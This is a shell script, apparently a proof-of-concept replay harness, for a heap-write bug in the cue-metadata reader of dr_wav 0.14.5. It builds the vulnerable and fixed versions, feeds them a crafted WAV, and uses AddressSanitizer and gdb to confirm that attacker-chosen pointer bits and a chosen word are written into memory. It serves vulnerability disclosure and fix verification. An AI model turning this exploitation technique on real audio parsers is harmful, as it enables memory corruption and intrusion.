#!/bin/sh
# Real-consumer replay for drwav2shell.
#
# The consumer is the UNMODIFIED upstream dr_libs 0.14.5 test program
# tests/wav/wav_decoding.c. Its decode_test_file() calls the public
# drwav_init_file_with_metadata() on a crafted on-disk WAV. The fixed lane uses
# the same consumer sources with the verbatim 0.14.6 pinned header. No consumer
# or library source is patched: the file alone carries the pointer low half.
set -u
HERE=$(cd "$(dirname "$0")" && pwd -P)
LAB=$(cd "$HERE/.." && pwd -P)
EVID="$HERE/evidence"
BUILD="$HERE/build"
WORK="$BUILD/work"
mkdir -p "$EVID" "$BUILD" "$WORK/tests/testvectors/wav/tests"

npass=0
nfail=0
ok() { npass=$((npass + 1)); echo "PASS $1"; }
no() { nfail=$((nfail + 1)); echo "FAIL $1"; }
expect() { if grep -q -- "$2" "$1"; then ok "$3"; else no "$3"; fi; }
expect_not() { if grep -q -- "$2" "$1"; then no "$3"; else ok "$3"; fi; }

if (cd "$LAB" && sha256sum -c pins/pins.sha256 && sha256sum -c consumer/consumer.sha256) >"$EVID/pins.out" 2>&1; then
    ok "all pinned bytes verified"
else
    no "all pinned bytes verified"
    cat "$EVID/pins.out"
fi

for side in vuln fixed; do
    mkdir -p "$BUILD/$side/tests/wav" "$BUILD/$side/tests/common"
    cp "$LAB/pins/$side/dr_wav.h" "$BUILD/$side/dr_wav.h" || exit 1
    cp "$LAB/consumer/upstream/wav/wav_decoding.c" "$LAB/consumer/upstream/wav/wav_common.c" "$BUILD/$side/tests/wav/" || exit 1
    cp "$LAB/consumer/upstream/common/dr_common.c" "$BUILD/$side/tests/common/" || exit 1
    if gcc -O0 -g -fsanitize=address -o "$BUILD/wav_decoding-$side" "$BUILD/$side/tests/wav/wav_decoding.c" -ldl -lm -lpthread; then
        ok "build $side consumer"
    else
        no "build $side consumer"
        exit 1
    fi
done

gen() {
    python3 "$HERE/make_wav.py" "$WORK/tests/testvectors/wav/tests/attack.wav" "$1" 0x4841434b "$2" >"$EVID/gen.out" 2>&1 || exit 1
}
run() {
    (cd "$WORK" && ASAN_OPTIONS=detect_leaks=0 "$BUILD/wav_decoding-$2"; echo "rc=$?") >"$EVID/$1.out" 2>&1
}

gen 0x41414141 1
run vuln-bad vuln
expect "$EVID/vuln-bad.out" "The signal is caused by a WRITE memory access" "vuln bad: sanitizer sees a WRITE"
expect "$EVID/vuln-bad.out" "0x50f041414155" "vuln bad: fault address carries file low bits"
expect "$EVID/vuln-bad.out" "drwav__read_cue_to_metadata_obj" "vuln bad: fault in cue metadata reader"
expect "$EVID/vuln-bad.out" "drwav_init_file_with_metadata" "vuln bad: reached through public file API"
expect "$EVID/vuln-bad.out" "decode_test_file" "vuln bad: reached from unmodified upstream consumer"
expect "$EVID/vuln-bad.out" "rc=1" "vuln bad: process fails"

gen 0x41414141 0
run vuln-safe vuln
expect "$EVID/vuln-safe.out" "attack.wav" "vuln safe: file processed"
expect "$EVID/vuln-safe.out" "Passed" "vuln safe: consumer passes"
expect "$EVID/vuln-safe.out" "rc=0" "vuln safe: clean exit"
expect_not "$EVID/vuln-safe.out" "ERROR: AddressSanitizer" "vuln safe: no sanitizer error"

run fixed-bad fixed
expect "$EVID/fixed-bad.out" "Passed" "fixed bad-pointer control: consumer passes"
expect "$EVID/fixed-bad.out" "rc=0" "fixed bad-pointer control: clean exit"
expect_not "$EVID/fixed-bad.out" "ERROR: AddressSanitizer" "fixed bad-pointer control: no sanitizer error"

# Chosen-pointer lane. 0x40 is the low half of the live metadata array in this
# build under setarch -R, measured with gdb; it is not attacker-known without
# a leak. No consumer or library source is patched.
if command -v gdb >/dev/null 2>&1 && command -v setarch >/dev/null 2>&1; then
    gen 0x40 1
    (cd "$WORK" && ASAN_OPTIONS=detect_leaks=0 setarch -R gdb -q -batch \
        -ex 'break wav_decoding.c:326' -ex run \
        -ex 'print/x wav.pMetadata' -ex 'x/8gx (char*)wav.pMetadata+16' \
        -ex 'printf "META_COUNT=%u\n", wav.metadataCount' \
        --args "$BUILD/wav_decoding-vuln") >"$EVID/gdb-chosen.out" 2>&1
    expect "$EVID/gdb-chosen.out" "0x424242424841434b" "chosen word written into live metadata object"
    expect "$EVID/gdb-chosen.out" "META_COUNT=1" "two parsed chunks, one reserved metadata slot"
else
    echo "SKIP gdb chosen-pointer readback (gdb or setarch unavailable)"
fi

echo "TOTAL PASS=$npass FAIL=$nfail"
[ "$nfail" -eq 0 ]
